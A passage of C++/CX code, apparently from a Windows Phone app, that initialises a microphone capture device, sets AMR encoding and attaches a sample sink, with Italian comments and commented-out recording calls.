	AudioTask.then([=](task<AudioVideoCaptureDevice^> getAudioTask)
	{
		try
		{
		/*****
				AudioVideoCaptureDevice^ captureDevice  = getPosTask.get();

				// Save the reference to the opened video capture device
				pAudioVideoCaptureDevice = captureDevice;
		*****/

				pAudioVideoCaptureDevice = getAudioTask.get();
/***
				// Retrieve the native ICameraCaptureDeviceNative interface from the managed video capture device
				ICameraCaptureDeviceNative *iCameraCaptureDeviceNative = NULL; 
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(ICameraCaptureDeviceNative), (void**) &iCameraCaptureDeviceNative);

				// Save the pointer to the native interface
				pCameraCaptureDeviceNative = iCameraCaptureDeviceNative;
***/			
				// Retrieve IAudioVideoCaptureDeviceNative native interface from managed projection.
				IAudioVideoCaptureDeviceNative *iAudioVideoCaptureDeviceNative = NULL;
				HRESULT hr = reinterpret_cast<IUnknown*>(pAudioVideoCaptureDevice)->QueryInterface(__uuidof(IAudioVideoCaptureDeviceNative), (void**) &iAudioVideoCaptureDeviceNative);

				// Save the pointer to the IAudioVideoCaptureDeviceNative native interface
				pAudioVideoCaptureDeviceNative = iAudioVideoCaptureDeviceNative;

				
				pAudioVideoCaptureDevice->AudioEncodingFormat = CameraCaptureAudioFormat::Amr;
				
				
				// Initialize and set the CameraCaptureSampleSink class as sink for captures samples
				MakeAndInitialize<CameraCaptureSampleSink>(&pCameraCaptureSampleSink);
				pAudioVideoCaptureDeviceNative->SetAudioSampleSink(pCameraCaptureSampleSink);

				//Start recording (only way to receive samples using the ICameraCaptureSampleSink interface
				//fAudio=TRUE;
				//pAudioVideoCaptureDevice->StartRecordingToSinkAsync();
				//////////fAudioCapture=TRUE;

				//TRUE => che ho finito l'inizializzazione
				//fAudioCapture=TRUE;
		}
		catch (Platform::Exception^ e) 
		{
#ifdef _DEBUG
			OutputDebugString(L"<<<eccezione capture Mic1 gestita>>>\n");
			///OutputDebugString(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));
#endif

			Log logInfo;
			//in realta' se arrivo qua è perche' c'e' un crash nel modulo per ora lo lascio cosi' per fare il debug
			logInfo.WriteLogInfo(L"Microphone is in use. [id1]");
			///logInfo.WriteLogInfo(*((wchar_t**)(*((int*)(((Platform::Exception^)((Platform::COMException^)(e)))) - 1)) + 1));

		}

	}).wait();


	// non serve: _Sleep(2000); //inserito per vedere se ritardando si evita il tak che capita ogni tanto sui lumia
	NativeCapture::pos=0;
	NativeCapture::nCamp=1;
#ifdef _DEBUG
	OutputDebugString(L"0Init) \n");
#endif
}
